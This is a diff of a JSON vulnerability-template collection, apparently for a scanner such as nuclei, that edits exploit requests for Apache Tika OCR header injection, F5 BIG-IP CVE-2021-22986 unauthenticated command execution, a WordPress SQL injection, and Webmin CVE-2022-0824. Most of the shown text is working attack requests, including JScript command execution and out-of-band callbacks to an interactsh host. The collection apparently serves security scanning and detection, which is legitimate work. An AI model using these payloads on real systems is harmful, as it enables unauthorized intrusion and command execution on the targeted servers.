@@ -6771,11 +6771,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -10349,8 +10349,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -14659,14 +14659,14 @@
     {
       "id": "CVE-2021-22986",
       "info": {
-        "name": "F5 BIG-IP iControl REST - Remote Command Execution",
+        "name": "F5 BIG-IP iControl REST unauthenticated RCE",
         "severity": "critical"
       },
       "requests": [
         {
           "raw": [
-            "POST /mgmt/shared/authn/login HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nAuthorization: Basic YWRtaW46\nContent-Type: application/json\nCookie: BIGIPAuthCookie=1234\n\n{\"username\":\"admin\",\"userReference\":{},\"loginReference\":{\"link\":\"http://localhost/mgmt/shared/gossip\"}}\n",
-            "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nX-F5-Auth-Token: {{token}}\nContent-Type: application/json\n\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}\n"
+            "POST /mgmt/shared/authn/login HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nAuthorization: Basic YWRtaW46\nContent-Type: application/json\nCookie: BIGIPAuthCookie=1234\nConnection: close\n\n{\"username\":\"admin\",\"userReference\":{},\"loginReference\":{\"link\":\"http://localhost/mgmt/shared/gossip\"}}\n",
+            "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nX-F5-Auth-Token: §token§\nContent-Type: application/json\nConnection: close\n\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}\n"
           ]
         }
       ]
@@ -15473,6 +15473,7 @@
       },
       "requests": [
         {
+          "method": "GET",
           "path": [
             "{{BaseURL}}/wp-json/guppy/v2/load-guppy-users?userId=1&offset=0&search="
           ]
@@ -19704,6 +19705,21 @@
         {
           "raw": [
             "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\naction=get-achievements&total_only=true&user_id=11 UNION ALL SELECT NULL,CONCAT(1,md5({{num}}),1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0824",
+      "info": {
+        "name": "Webmin prior to 1.990 - Improper Access Control to Remote Code Execution",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /session_login.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nCookie: redirect=1;testing=1;PHPSESSID=;\n\nuser={{username}}&pass={{password}}\n",
+            "POST /extensions/file-manager/http_download.cgi?module=filemin HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: {{RootURL}}/filemin/?xnavigation=1\n\nlink=http://{{interactsh-url}}&username=&password=&path=/{{ranstr}}\n"
           ]
         }
       ]
